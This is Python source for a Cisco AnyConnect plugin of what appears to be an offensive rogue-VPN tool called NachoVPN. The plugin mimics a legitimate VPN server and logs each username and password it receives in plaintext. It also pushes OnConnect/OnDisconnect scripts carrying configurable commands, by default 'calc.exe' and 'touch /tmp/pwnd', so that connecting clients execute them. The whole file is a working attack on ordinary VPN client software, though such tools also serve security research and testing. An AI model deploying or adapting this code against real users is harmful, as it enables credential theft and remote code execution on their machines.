from nachovpn.plugins import VPNPlugin
from flask import Response, abort, request
from jinja2 import Template

import logging
import hashlib
import re
import os

# https://datatracker.ietf.org/doc/html/draft-mavrogiannopoulos-openconnect-02
class CTSP:
    class Constants:
        MAGIC_NUMBER = 0x53544601
        HEADER_LENGTH = 8

    class PacketType:
        DATA = 0x00
        DPD_REQ = 0x03
        DPD_RESP = 0x04
        DISCONNECT = 0x05
        KEEPALIVE = 0x07
        COMPRESSED_DATA = 0x08
        TERMINATE = 0x09

    def __init__(self, socket, packet_handler=None, connection_id=None):
        self.socket = socket
        self.packet_handler = packet_handler
        self.connection_id = connection_id

    @staticmethod
    def create_packet(packet_type, data=b''):
        resp = CTSP.Constants.MAGIC_NUMBER.to_bytes(4, 'big')
        resp += (len(data)).to_bytes(2, 'big')
        resp += packet_type.to_bytes(1, 'big')
        resp += b'\x00'
        resp += data
        return resp

    # Section 2.5: The Keepalive and Dead Peer Detection Protocols
    def send_dpd_resp(self, req_data):
        # Send a DPD-RESP packet back to the client
        # and attach any additional data from the DPD-REQ packet
        resp = self.create_packet(self.PacketType.DPD_RESP, req_data)
        logging.info(f"Sending DPD-RESP: {resp.hex()}")
        self.socket.sendall(resp)

    def send_keepalive(self):
        # Just send a KEEPALIVE packet back to the client
        resp = self.create_packet(self.PacketType.KEEPALIVE)
        logging.info(f"Sending KEEPALIVE: {resp.hex()}")
        self.socket.sendall(resp)

    def parse(self, data):
        try:
            if int.from_bytes(data[0:4], byteorder='big') != self.Constants.MAGIC_NUMBER:
                raise Exception("Invalid packet")

            packet_length = int.from_bytes(data[4:6], byteorder='big')
            packet_type = data[6]

            if len(data) - self.Constants.HEADER_LENGTH != packet_length:
                raise Exception(f"Invalid packet length: {packet_length}")

            packet_data = data[self.Constants.HEADER_LENGTH:]

            if packet_type == self.PacketType.DATA:
                # Check if the packet is a valid IPv4 packet
                if len(packet_data) >= 20 and (packet_data[0] >> 4) == 4 and self.packet_handler is not None:
                    logging.debug(f"Received valid IPv4 packet")

                    # Handle packet with the packet handler
                    self.packet_handler.handle_client_packet(
                        packet_data,
                        self.connection_id
                    )

            elif packet_type == self.PacketType.DISCONNECT:
                logging.info(f"Received disconnect packet. Message: {packet_data[1:].decode()}")

            elif packet_type == self.PacketType.DPD_REQ:
                logging.info(f"Received DPD-REQ packet. Replying with DPD-RESP")
                self.send_dpd_resp(packet_data)

            elif packet_type == self.PacketType.KEEPALIVE:
                logging.info(f"Received keepalive packet")
                self.send_keepalive()

            elif packet_type == self.PacketType.COMPRESSED_DATA:
                logging.info(f"Received compressed packet")

            elif packet_type == self.PacketType.TERMINATE:
                logging.info(f"Received terminate packet")

            else:
                logging.warning(f"Unknown packet type: {packet_type:04x}")
                logging.warning(f"Packet data: {packet_data.hex()}")
        except Exception as e:
            logging.error(f"Error parsing packet: {e}")


class CiscoPlugin(VPNPlugin):
    def __init__(self, *args, **kwargs):
        # provide the templates directory relative to this plugin
        super().__init__(*args, **kwargs, template_dir=os.path.join(os.path.dirname(__file__), 'templates'))
        self.vpn_name = os.getenv("VPN_NAME", "NachoVPN")
        self.files_dir = os.path.join(os.path.dirname(__file__), "files")
        self.cisco_command_win = os.getenv("CISCO_COMMAND_WIN", "calc.exe")
        self.cisco_command_macos = os.getenv("CISCO_COMMAND_MACOS", "touch /tmp/pwnd")

    def shasum(self, data):
        if isinstance(data, str):
            data = data.encode()
        return hashlib.sha1(data).hexdigest().upper()

    def handle_http(self, handler):
        if handler.command == 'GET':
            self.handle_get(handler)
        elif handler.command == 'POST':
            self.handle_post(handler)
        elif handler.command == 'HEAD':
            self.handle_head(handler)
        elif handler.command == 'CONNECT':
            self.handle_connect(handler)
        return True

    def render_file(self, filename, context):
        with open(filename, "r") as f:
            template = Template(f.read())
            return template.render(context)

    def _setup_routes(self):
        # Call the parent class's route setup
        super()._setup_routes()

        @self.flask_app.route('/CACHE/stc/profiles/profile.xml', methods=['GET'])
        def profile():
            self.logger.info("Loading profile file")
            xml = self.render_template("profile.xml")
            response = xml.encode()
            return Response(response, status=200, mimetype='text/html')

        @self.flask_app.route('/+CSCOT+/oem-customization', methods=['GET'])
        def oem_customization():
            self.logger.info("Handling OEM customization")
            name = request.args.get('name')
            script_path = os.path.join(self.files_dir, os.path.basename(name.lstrip('scripts_')))
            context = {
                'cisco_command_win': self.cisco_command_win,
                'cisco_command_macos': self.cisco_command_macos
            }
            if name and os.path.exists(script_path):
                content = self.render_file(script_path, context)
                return Response(content, status=200, mimetype="application/octet-stream")
            return abort(404)

        @self.flask_app.route('/', methods=['POST'])
        def post():
            self.logger.info("Handling POST")
            headers = {'X-Aggregate-Auth': '1'}
            body = request.get_data().decode()
            if 'type="init"' in body:
                self.logger.info("Handling INIT")
                xml = self.render_template("prelogin.xml", vpn_name=self.vpn_name)
                self.logger.info(f"Sending prelogin.xml")
                response = xml.encode()
                return Response(response, status=200, mimetype='text/html', headers=headers)
            elif 'type="auth-reply"' in body:
                self.logger.info("Handling AUTH-REPLY")
                username = re.search('<username>(.*)</username>', body).group(1)
                password = re.search('<password>(.*)</password>', body).group(1)
                self.logger.info(f"Received username: {username} and password: {password}")
                info = {'User-Agent': request.headers.get('User-Agent')}
                self.db_manager.log_credentials(
                    username,
                    password,
                    self.__class__.__name__,
                    info
                )

                self.logger.info("Sending auth reply")

                # Calculate hashes
                profile_xml = self.render_template("profile.xml")
                profile_hash = self.shasum(profile_xml)

                # build a table of hashes for the script files
                script_hashes = [
                    {'platform': "win", 'filename': "OnDisconnect.vbs", 'hash': None},
                    {'platform': "win", 'filename': "OnConnect.vbs", 'hash': None},
                    {'platform': "mac-intel", 'filename': "OnDisconnect.sh", 'hash': None},
                    {'platform': "mac-intel", 'filename': "OnConnect.sh", 'hash': None}
                ]

                # iterate over the script_hashes and calculate the hash for each file
                for script in script_hashes:
                    script_path = os.path.join(self.files_dir, script['filename'])
                    context = {
                        'cisco_command_win': self.cisco_command_win,
                        'cisco_command_macos': self.cisco_command_macos
                    }
                    if os.path.exists(script_path):
                        content = self.render_file(script_path, context)
                        script['hash'] = self.shasum(content)

                xml = self.render_template("login.xml",
                    server_cert_hash=self.get_thumbprint()['sha1'],
                    profile_hash=profile_hash,
                    script_hashes=script_hashes
                )
                response = xml.encode()
                return Response(response, status=200, mimetype='text/html', headers=headers)

            return abort(404)

    def handle_head(self, handler):
        handler.send_response(200)

    def handle_connect(self, handler):
        self.logger.info(f"Handling CONNECT for {handler.path}")
        try:
            # Create a new session and get the connection_id
            connection_id, ip_address = self.packet_handler.create_session(handler.connection, self._wrap_packet)
            session_id = hashlib.sha256(connection_id.encode()).hexdigest().upper()
            hostname = f"{connection_id[:8]}.nachovpn.local"
            self.logger.debug(f"Connection ID: {connection_id}, IP Address: {ip_address}, Session ID: {session_id}, Hostname: {hostname}")

            # Send headers
            headers = [
                b"HTTP/1.1 200 OK",
                b"X-CSTP-Version: 1",
                b"X-CSTP-Protocol: Copyright (c) 2004 Cisco Systems, Inc.",
                f"X-CSTP-Address: {ip_address}".encode(),
                b"X-CSTP-Netmask: 255.255.255.0",
                f"X-CSTP-Hostname: {hostname}".encode(),
                b"X-CSTP-Lease-Duration: 1209600",
                b"X-CSTP-Session-Timeout: none",
                b"X-CSTP-Session-Timeout-Alert-Interval: 60",
                b"X-CSTP-Session-Timeout-Remaining: none",
                b"X-CSTP-Idle-Timeout: 1800",
                b"X-CSTP-DNS: 8.8.8.8",
                b"X-CSTP-Disconnected-Timeout: 1800",
                #b"X-CSTP-Split-Include: 10.10.0.0/255.255.255.0",
                b"X-CSTP-Keep: true",
                b"X-CSTP-Tunnel-All-DNS: true",
                b"X-CSTP-DPD: 0",
                b"X-CSTP-Keepalive: 0",
                b"X-CSTP-MSIE-Proxy-Lockdown: false",
                b"X-CSTP-Smartcard-Removal-Disconnect: true",
                f"X-DTLS-Session-ID: {session_id}".encode(),
                b"X-DTLS-Port: 80",
                b"X-DTLS-Keepalive: 0",
                b"X-DTLS-DPD: 0",
                b"X-CSTP-MTU: 1400",
                b"X-DTLS-MTU: 1400",
                b"X-DTLS12-CipherSuite: ECDHE-RSA-AES256-GCM-SHA384",
                b"X-CSTP-Routing-Filtering-Ignore: false",
                b"X-CSTP-Quarantine: false",
                b"X-CSTP-Disable-Always-On-VPN: false",
                b"X-CSTP-Client-Bypass-Protocol: false",
                b"X-CSTP-TCP-Keepalive: false",
                b"",
                b""
            ]
            handler.wfile.write(b"\r\n".join(headers))
            handler.wfile.flush()

            # Create CTSP parser
            parser = CTSP(handler.connection, packet_handler=self.packet_handler, connection_id=connection_id)

            # Just keep reading from the client forever
            while True:
                try:
                    data = handler.connection.recv(8192)
                    if not data:
                        self.logger.info('Connection closed by client')
                        break

                    # Parse the packet data
                    parser.parse(data)

                except Exception as e:
                    self.logger.error(f"Connection error: {e}")
                    break

        except Exception as e:
            self.logger.error(f"CONNECT error: {e}")
        finally:
            self.logger.info("Closing CONNECT tunnel")
            self.packet_handler.destroy_session(connection_id)
            handler.connection.close()

    def _wrap_packet(self, packet_data, client):
        return CTSP.create_packet(CTSP.PacketType.DATA, packet_data)

    def can_handle_data(self, data, client_socket, client_ip):
        return len(data) >= 4 and CTSP.Constants.MAGIC_NUMBER == int.from_bytes(data[:4], byteorder='big')

    def can_handle_http(self, handler):
        user_agent = handler.headers.get('User-Agent', '')
        if 'AnyConnect' in user_agent:
            return True
        return False

    def handle_data(self, data, client_socket, client_ip):
        try:
            connection_id, _ = self.packet_handler.create_session(client_socket, self._wrap_packet)
            parser = CTSP(client_socket, packet_handler=self.packet_handler, connection_id=connection_id)
            parser.parse(data)
        except Exception as e:
            self.logger.error(f"Error handling Cisco data: {e}")
        finally:
            self.packet_handler.destroy_session(connection_id)
            client_socket.close()
        return True